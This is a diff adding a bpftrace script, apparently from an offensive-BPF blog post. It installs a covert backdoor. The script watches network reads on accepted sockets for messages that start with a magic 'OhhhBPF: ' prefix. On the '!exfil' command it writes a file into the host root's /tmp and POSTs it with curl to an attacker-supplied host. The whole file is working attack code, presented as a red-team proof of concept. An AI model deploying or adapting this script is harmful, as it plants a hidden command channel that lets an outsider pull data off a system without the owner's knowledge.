@@ -1,0 +1,61 @@
+// https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace-message-based/
+
+BEGIN
+{
+    printf("Welcome to my test program... Use Ctrl+C to exit.\n");
+}
+
+
+tracepoint:syscalls:sys_enter_accept*
+{ 
+  @sk[tid] = args->upeer_sockaddr;
+}
+
+tracepoint:syscalls:sys_exit_accept*
+/ @sk[tid] /
+{
+  @sys_accepted[tid] = @sk[tid]; 
+}
+
+tracepoint:syscalls:sys_enter_read
+/ @sys_accepted[tid] /
+{   
+  printf("->sys_enter_read for allowed thread (fd: %d)\n", args->fd);
+  @sys_read[tid] = args->buf;
+}
+
+tracepoint:syscalls:sys_exit_read
+{
+  $len = args->ret;
+
+  if ((@sys_read[tid] != 0) && ($len > 9))
+  { 
+    //lot's of assumption, but should work for line based protocols
+    $cmd = str(@sys_read[tid], 9);
+    if ($cmd == "OhhhBPF: ")
+    {
+      $cmd = str(@sys_read[tid]+9, $len-9-1);
+      printf("*** Command: %s\n", $cmd);
+
+      if ($cmd == "!exfil")
+      {   
+        printf("Command:exfil\n");
+        system("echo POC > /proc/1/root/tmp/o");
+        system("curl -X POST --data-binary @/proc/1/root/tmp/o %s", str($1));
+        system("rm -f /proc/1/root/tmp/o");
+      }
+      else
+      {
+       // do other stuff
+      }
+    }
+  } 
+}
+
+END
+{
+    clear(@sk);
+    clear(@sys_read);
+    clear(@sys_accepted);
+    printf("Exiting. Bye.\n");
+}
